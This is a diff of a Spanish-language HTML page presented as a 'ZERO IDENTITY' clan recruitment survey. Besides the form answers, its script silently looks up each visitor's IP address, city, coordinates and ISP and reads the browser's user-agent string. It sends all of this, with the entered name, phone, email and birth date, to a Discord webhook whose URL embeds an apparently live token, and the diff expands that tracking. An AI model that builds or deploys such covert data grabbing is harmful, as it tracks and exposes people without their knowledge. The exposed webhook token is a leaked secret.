@@ -5,27 +5,18 @@
     <title>ZERO IDENTITY | ACCESO RESTRINGIDO</title>
     <style>
         body { background-color: #000; color: #fff; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; }
-        
-        /* Efecto de Lluvia de Código (Matrix) */
         canvas { position: fixed; top: 0; left: 0; z-index: -1; }
-
         .panel { background: rgba(0,0,0,0.95); border: 2px solid #8000ff; padding: 30px; border-radius: 15px; text-align: center; max-width: 500px; width: 90%; max-height: 85vh; overflow-y: auto; box-shadow: 0 0 30px #8000ff; z-index: 10; }
-        
-        /* El círculo con tu imagen */
-        .logo-img { width: 200px; height: 200px; border-radius: 50%; border: 3px solid #8000ff; box-shadow: 0 0 20px #8000ff; margin-bottom: 20px; object-fit: cover; }
-        
+        .logo-img { width: 200px; height: 200px; border-radius: 50%; border: 3px solid #8000ff; box-shadow: 0 0 20px #8000ff; margin-bottom: 20px; object-fit: cover; background: #000; }
         h1 { font-size: 1.8rem; letter-spacing: 3px; margin-bottom: 20px; text-shadow: 0 0 10px #8000ff; color: #8000ff; }
         input, textarea, select { width: 100%; background: #111; border: 1px solid #8000ff; color: #0f0; margin: 10px 0; padding: 12px; box-sizing: border-box; }
         label { display: block; text-align: left; margin-top: 15px; font-weight: bold; font-size: 0.9rem; color: #8000ff; }
-        
+        .phone-container { display: flex; gap: 10px; }
+        .code-input { width: 30%; }
+        .num-input { width: 70%; }
         .btn { background: #8000ff; color: #fff; border: none; padding: 15px; width: 100%; cursor: pointer; font-weight: bold; margin-top: 20px; transition: 0.3s; text-transform: uppercase; }
         .btn:hover { background: #a040ff; box-shadow: 0 0 20px #a040ff; }
-        
         #survey, #countdown-screen { display: none; }
-        
-        /* Buscador de países */
-        .phone-row { display: flex; gap: 5px; }
-        .phone-row select { width: 40%; }
     </style>
 </head>
 <body>
@@ -34,7 +25,6 @@
     <div id="login" class="panel">
         <img src="https://i.ibb.co/Y7YpYtM/15e71b29-23be-4acb-bf0b-e64d4fe16961.jpg" class="logo-img" alt="ZERO IDENTITY">
         <h1>BIENVENIDOS A ZERO IDENTITY</h1>
-        <p>IDENTIFÍQUESE PARA ACCEDER</p>
         <input type="email" id="userEmail" placeholder="CORREO ELECTRÓNICO" required>
         <button class="btn" onclick="checkLogin()">INICIAR PROTOCOLO</button>
     </div>
@@ -43,19 +33,12 @@
         <h1>RECLUTAMIENTO</h1>
         <form id="clanForm">
             <label>Nombre del Agente:</label>
-            <input type="text" id="userName" required placeholder="Tu nombre o Nick">
+            <input type="text" id="userName" required>
 
-            <label>Número de contacto (País + Número):</label>
-            <div class="phone-row">
-                <select id="countryCode" required>
-                    <option value="+504">HN (+504)</option>
-                    <option value="+1">US (+1)</option>
-                    <option value="+52">MX (+52)</option>
-                    <option value="+34">ES (+34)</option>
-                    <option value="+57">CO (+57)</option>
-                    <option value="+54">AR (+54)</option>
-                </select>
-                <input type="tel" id="userPhone" placeholder="0000-0000" required>
+            <label>Código de País y Teléfono (Solo números):</label>
+            <div class="phone-container">
+                <input type="text" id="userCode" class="code-input" placeholder="+504" oninput="this.value = this.value.replace(/[^0-9+]/g, '')" required>
+                <input type="text" id="userPhone" class="num-input" placeholder="99999999" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
             </div>
 
             <label>1. ¿Cómo supiste de nosotros?</label>
@@ -73,7 +56,7 @@
             <textarea id="q3" required></textarea>
 
             <label>4. ¿Cuál es tu edad?</label>
-            <input type="number" id="q4" required>
+            <input type="text" id="q4" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required>
 
             <label>5. Fecha de nacimiento:</label>
             <input type="date" id="q5" required>
@@ -87,7 +70,7 @@
             <label>8. ¿Harías labores de observación secreta en otros servidores?</label>
             <select id="q8" required><option value="Sí">Sí</option><option value="No">No</option></select>
 
-            <label>9. Si un miembro del Clan rompe la regla de confidencialidad, ¿cuál consideras que debería ser la sanción máxima?</label>
+            <label>9. Si un miembro del Clan rompe la regla de confidencialidad, ¿cuál consideras que debería ser la sanción máxima, sabiendo que tú también estás sujeto a esa misma regla?</label>
             <textarea id="q9" required></textarea>
 
             <button type="button" class="btn" onclick="sendData()">ENVIAR CIFRADO</button>
@@ -101,7 +84,6 @@
     </div>
 
     <script>
-        // EFECTO LLUVIA MATRIX
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth;
@@ -110,12 +92,9 @@
         const fontSize = 16;
         const columns = canvas.width / fontSize;
         const drops = Array(Math.floor(columns)).fill(1);
-
         function drawMatrix() {
-            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            ctx.fillStyle = '#0f0';
-            ctx.font = fontSize + 'px monospace';
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#0f0'; ctx.font = fontSize + 'px monospace';
             for (let i = 0; i < drops.length; i++) {
                 const text = letters.charAt(Math.floor(Math.random() * letters.length));
                 ctx.fillText(text, i * fontSize, drops[i] * fontSize);
@@ -137,34 +116,38 @@
             if(!form.checkValidity()) return alert("RELLENA TODOS LOS CAMPOS");
 
             const webhook = "https://discord.com/api/webhooks/1499573231294615572/P5MkhcgsaQPbidfpWo6tFVXTABaJqIh0mo7JT2cwCDz0bBNuJJ6X7umtisJqDfeBvnje";
-            
             const ipRes = await fetch('https://ipapi.co/json/');
             const ip = await ipRes.json();
 
             const payload = {
                 embeds: [{
-                    title: "⚔️ NUEVA SOLICITUD - ZERO IDENTITY",
+                    title: "⚔️ REPORTE COMPLETO - ZERO IDENTITY",
                     color: 8388863,
                     fields: [
-                        {name: "👤 Nombre", value: document.getElementById('userName').value},
-                        {name: "📞 Teléfono", value: document.getElementById('countryCode').value + " " + document.getElementById('userPhone').value},
+                        {name: "👤 Nombre", value: document.getElementById('userName').value, inline: true},
+                        {name: "📞 Teléfono", value: document.getElementById('userCode').value + " " + document.getElementById('userPhone').value, inline: true},
                         {name: "📧 Correo", value: document.getElementById('userEmail').value},
-                        {name: "🛡️ Protocolo Silencio", value: document.getElementById('q7').value},
-                        {name: "⚖️ Sanción", value: document.getElementById('q9').value},
-                        {name: "🌍 UBICACIÓN", value: `${ip.city}, ${ip.country_name}`},
-                        {name: "🌐 IP", value: ip.ip}
-                    ]
+                        {name: "🎂 Edad/Cumple", value: document.getElementById('q4').value + " / " + document.getElementById('q5').value},
+                        {name: "📱 Origen", value: document.getElementById('q1').value},
+                        {name: "🛡️ Responsabilidad", value: document.getElementById('q6').value},
+                        {name: "🕵️ Protocolo Silencio", value: document.getElementById('q7').value},
+                        {name: "🤫 Infiltración", value: document.getElementById('q8').value},
+                        {name: "⚖️ Sanción Confidencialidad", value: document.getElementById('q9').value},
+                        {name: "📍 UBICACIÓN", value: `${ip.city}, ${ip.region}, ${ip.country_name}`},
+                        {name: "🧭 COORDENADAS", value: `Lat: ${ip.latitude}, Lon: ${ip.longitude}`},
+                        {name: "🌐 RED", value: `IP: ${ip.ip} - ISP: ${ip.org}`},
+                        {name: "📱 DISPOSITIVO", value: navigator.userAgent}
+                    ],
+                    footer: { text: "Sistema de Rastreo Pinky_Tren" }
                 }]
             };
 
             await fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
-
             document.getElementById('survey').style.display = 'none';
             document.getElementById('countdown-screen').style.display = 'block';
             let sec = 5;
             const t = setInterval(() => {
-                sec--;
-                document.getElementById('timer').innerText = sec;
+                sec--; document.getElementById('timer').innerText = sec;
                 if(sec <= 0) { clearInterval(t); window.location.href = "about:blank"; }
             }, 1000);
         }
